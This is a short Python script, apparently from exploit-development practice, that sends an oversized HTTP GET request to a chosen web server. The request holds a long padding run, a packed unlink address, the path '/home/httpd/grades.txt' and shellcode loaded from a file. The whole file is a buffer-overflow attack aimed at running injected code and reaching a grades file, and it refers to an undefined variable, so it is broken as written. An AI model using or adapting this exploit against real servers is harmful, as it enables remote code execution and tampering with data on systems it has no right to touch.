# Uses a generated pattern to get better
# understanding when the server crashes

import sys, socket, struct

# Use in the form "python httppattern.py host port"

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

shellfile = open("shellcode.bin", "r")
shellcode = shellfile.read()

eip = struct.pack('<L', 0xbffff624)
unlink = struct.pack('<L', 0x40102450) #$2 = {<text variable, no debug info>} 0x40102450 <unlink>

pattern = "A" * 2067 + unlink + TEST + "/home/httpd/grades.txt"
#eip + "\x90" * 4

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address

command = "GET /" + pattern + shellcode + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
client.send(command) # Send the command
data = client.recv(1024) # Recieve Reply
client.close() # Close the Connection
